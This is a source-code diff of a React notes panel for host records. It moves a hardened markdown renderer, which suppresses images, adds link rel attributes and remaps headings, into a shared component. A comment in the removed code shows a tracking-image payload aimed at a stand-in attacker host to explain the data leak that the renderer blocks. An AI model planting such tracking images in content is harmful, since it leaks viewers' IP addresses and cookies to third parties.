@@ -1,11 +1,10 @@
 import MDEditor from "@uiw/react-md-editor";
 import { Loader2, PencilLine, Plus, Trash2 } from "lucide-react";
 import { useTheme } from "next-themes";
-import { useDeferredValue, useState } from "react";
-import Markdown, { type Components } from "react-markdown";
-import remarkGfm from "remark-gfm";
+import { useState } from "react";
 import { toast } from "sonner";
 
+import { NoteMarkdownBody } from "@/components/NoteMarkdownBody";
 import { Button } from "@/components/ui/button";
 import {
   Collapsible,
@@ -31,7 +30,6 @@ import {
 } from "@/lib/api";
 import { useAuthMe } from "@/lib/auth";
 import { formatTimestamp } from "@/lib/format";
-import { cn } from "@/lib/utils";
 
 export interface HostNotesPanelProps {
   /** Caller-facing host address (printable IP string) used as the
@@ -74,8 +72,9 @@ export interface HostNotesPanelProps {
  *
  * Read-mode security / a11y hardenings (image-fetch suppression,
  * ``rel="noopener noreferrer"`` on links, markdown heading-level
- * remap, GFM table overflow containment) are documented on
- * :func:`MarkdownBody`.
+ * remap, GFM table overflow containment) are owned by
+ * :func:`NoteMarkdownBody` -- the shared renderer reused by
+ * every read-only notes consumer in the SPA.
  */
 export function HostNotesPanel({ addr }: HostNotesPanelProps) {
   const query = useHostNote(addr);
@@ -275,7 +274,7 @@ function NoteDisplay({
 
   return (
     <div data-testid="host-notes-content">
-      <MarkdownBody body={note.body} />
+      <NoteMarkdownBody body={note.body} />
       <div className="mt-3 flex items-center justify-between gap-2">
         <p className="text-xs text-muted-foreground">
           Last updated by{" "}
@@ -440,7 +439,7 @@ function RevisionItem({ revision }: { revision: NoteRevision }) {
         </CollapsibleTrigger>
         <CollapsibleContent>
           <div className="mt-1 rounded border border-muted bg-muted/40 p-2">
-            <MarkdownBody body={revision.body} />
+            <NoteMarkdownBody body={revision.body} />
           </div>
         </CollapsibleContent>
       </Collapsible>
@@ -621,11 +620,12 @@ function NoteEditor({
         onChange={(val) => setDraft(val ?? "")}
         // ``preview="live"`` shows editor + rendered preview
         // side-by-side.  Use the editor's built-in preview here
-        // rather than our ``MarkdownBody`` -- the editor's
+        // rather than our ``NoteMarkdownBody`` -- the editor's
         // textarea and toolbar are tightly coupled to its own
         // preview pane; swapping in a custom preview component
         // is non-trivial without losing the toolbar shortcuts.
-        // The read-mode display below still uses ``MarkdownBody``.
+        // The read-mode display below still uses
+        // ``NoteMarkdownBody``.
         preview="live"
         height={300}
         textareaProps={{
@@ -709,102 +709,4 @@ function ConflictDialog({
   );
 }
 
-/* ------------------------------------------------------------------ */
-/* Markdown renderer (shared by read-mode + revision-history items)    */
-/* ------------------------------------------------------------------ */
 
-/** Strip the ``node`` prop ``react-markdown`` passes to every
- *  component override -- it is the hast AST node, not a valid
- *  DOM attribute, and spreading it onto an HTML element would
- *  emit a runtime ``Unknown DOM attribute`` warning. */
-function stripHastNode<T extends { node?: unknown }>(
-  props: T,
-): Omit<T, "node"> {
-  const { node, ...rest } = props;
-  // ``void node`` acknowledges the binding so it satisfies the
-  // no-unused-vars rule without ``// eslint-disable`` or an
-  // ``_node`` underscore alias.
-  void node;
-  return rest;
-}
-
-const MARKDOWN_COMPONENTS: Components = {
-  // Suppress image fetches.  An operator-authored
-  // ``![alt](https://attacker/track?h=...)`` would otherwise
-  // cause the viewing browser to GET the URL on render,
-  // leaking IP / Referer / cookies to the third party.
-  // Fall back to the alt text in italic so operators who pasted
-  // ``![diagram](...)`` still see "diagram" instead of nothing.
-  img: ({ alt }) =>
-    alt ? <em className="text-muted-foreground">{alt}</em> : null,
-  // Outbound links get ``noopener noreferrer`` so a click does
-  // not leak the IVRE detail-sheet URL as ``Referer`` and the
-  // destination cannot access ``window.opener``.
-  a: (props) => {
-    const { children, ...rest } = stripHastNode(props);
-    return (
-      <a {...rest} rel="noopener noreferrer">
-        {children}
-      </a>
-    );
-  },
-  // Wrap GFM tables in a horizontally-scrollable container.
-  table: (props) => (
-    <div className="overflow-x-auto">
-      <table {...stripHastNode(props)} />
-    </div>
-  ),
-  // Remap markdown heading levels two down so an operator-authored
-  // ``#`` lands on ``<h4>`` (the section heading is ``<h3>``)
-  // rather than ``<h1>``, keeping the document hierarchy
-  // monotone for screen-reader heading navigation.
-  h1: (props) => <h4 {...stripHastNode(props)} />,
-  h2: (props) => <h5 {...stripHastNode(props)} />,
-  h3: (props) => <h6 {...stripHastNode(props)} />,
-  h4: (props) => <h6 {...stripHastNode(props)} />,
-  h5: (props) => <h6 {...stripHastNode(props)} />,
-  h6: (props) => <h6 {...stripHastNode(props)} />,
-};
-
-const MARKDOWN_PLUGINS = [remarkGfm];
-
-/** Tailwind-flavoured prose container for the rendered markdown.
- *  Heading styling rules target ``<h4>`` / ``<h5>`` / ``<h6>``
- *  to match the level-remap above. */
-function MarkdownBody({ body }: { body: string }) {
-  // ``useDeferredValue`` marks the heavy ``react-markdown`` parse
-  // as low-priority work so a large note (1 MiB API cap) does
-  // not block the host detail sheet's open animation on the
-  // same React commit.
-  const deferredBody = useDeferredValue(body);
-  return (
-    <div
-      className={cn(
-        "text-sm leading-relaxed",
-        "[&_h4]:mt-3 [&_h4]:mb-2 [&_h4]:text-base [&_h4]:font-semibold",
-        "[&_h5]:mt-3 [&_h5]:mb-2 [&_h5]:text-sm [&_h5]:font-semibold",
-        "[&_h6]:mt-3 [&_h6]:mb-1 [&_h6]:text-sm [&_h6]:font-semibold",
-        "[&_p]:my-2",
-        "[&_ul]:my-2 [&_ul]:list-disc [&_ul]:pl-5",
-        "[&_ol]:my-2 [&_ol]:list-decimal [&_ol]:pl-5",
-        "[&_li]:my-1",
-        "[&_code]:rounded [&_code]:bg-muted [&_code]:px-1 [&_code]:py-0.5 [&_code]:font-mono [&_code]:text-xs",
-        "[&_pre]:my-2 [&_pre]:overflow-x-auto [&_pre]:rounded [&_pre]:bg-muted [&_pre]:p-2",
-        "[&_pre_code]:bg-transparent [&_pre_code]:p-0",
-        "[&_blockquote]:my-2 [&_blockquote]:border-l-2 [&_blockquote]:border-muted [&_blockquote]:pl-3 [&_blockquote]:italic [&_blockquote]:text-muted-foreground",
-        "[&_table]:my-2 [&_table]:w-full [&_table]:border-collapse",
-        "[&_th]:border [&_th]:border-muted [&_th]:bg-muted/50 [&_th]:px-2 [&_th]:py-1 [&_th]:text-left",
-        "[&_td]:border [&_td]:border-muted [&_td]:px-2 [&_td]:py-1",
-        "[&_a]:text-primary [&_a]:underline [&_a]:underline-offset-2 hover:[&_a]:no-underline",
-        "[&_hr]:my-3 [&_hr]:border-muted",
-      )}
-    >
-      <Markdown
-        remarkPlugins={MARKDOWN_PLUGINS}
-        components={MARKDOWN_COMPONENTS}
-      >
-        {deferredBody}
-      </Markdown>
-    </div>
-  );
-}
